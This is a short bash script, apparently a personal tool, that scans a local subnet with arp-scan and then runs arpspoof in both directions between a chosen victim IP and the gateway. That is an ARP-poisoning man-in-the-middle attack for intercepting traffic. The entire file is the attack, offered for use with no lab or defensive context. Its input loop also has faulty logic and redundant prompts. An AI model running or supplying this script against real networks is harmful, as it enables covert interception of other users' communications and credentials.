#!/bin/bash
# CREATED BY AHMED HAMAD 
#THIS IS NEW EDIT **** DATE:28/09/2016 TIME:05:34 PM Egypt ****
# *********************&&&&&&&&&&&&&*******^^^^^^^^^^^^^^^^^^****%%%%%%*************
#ARPSCAN COMMANDS
read -p "Please enter the Gateway to scan the ip:  " gateway
sudo arp-scan $gateway/24
#LOOP COMMNADS
read -p "Pleas Enter The ip from above: " ip
until [ $ip -a $gateway ]
do
	echo "******************************please enter the ip,Gateway,Interface*******************************"
	read -p "Pleas Enter The ip from above: " ip
        read -p "enter the interface name [#ex:wlan0,eth0]: "  iface

done
#ARPSPOOF COMMANDS
read -p "enter the interface name [#ex:wlan0,eth0]: "  iface
sudo arpspoof -i $iface -t $ip -r $gateway




